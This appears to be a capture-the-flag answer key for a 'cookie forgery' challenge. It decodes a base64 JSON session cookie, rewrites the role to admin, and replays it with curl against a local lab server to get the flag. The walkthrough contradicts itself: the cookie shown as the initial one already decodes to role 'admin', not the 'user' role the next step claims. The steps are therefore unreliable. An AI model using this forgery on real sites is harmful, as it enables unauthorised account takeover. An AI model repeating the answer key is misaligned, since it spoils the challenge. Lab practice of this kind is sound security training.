Solution: A07 - COOKIE FORGERY

Concept  
Client-side session forgery without cryptographic integrity validation.

Walkthrough  
1. Inspect the initial cookie:
   `session=eyJ1c2VyIjogImd1ZXN0IiwgInJvbGUiOiAiYWRtaW4ifQ==`
2. Base64-decode:
   ```json
   {"user": "guest", "role": "user"}
   ```
3. Craft an administrator JSON payload:
   ```json
   {"user": "admin", "role": "admin"}
   ```
4. Base64-encode:
   `eyJ1c2VyIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifQ==`
5. Send request with the forged session cookie:
   ```bash
   curl -H "Cookie: session=eyJ1c2VyIjogImFkbWluIiwgInJvbGUiOiAiYWRtaW4ifQ==" http://localhost:5001/
   ```
6. The server returns `flag{tampered session token}`.

Flag  
`flag{tampered session token}`
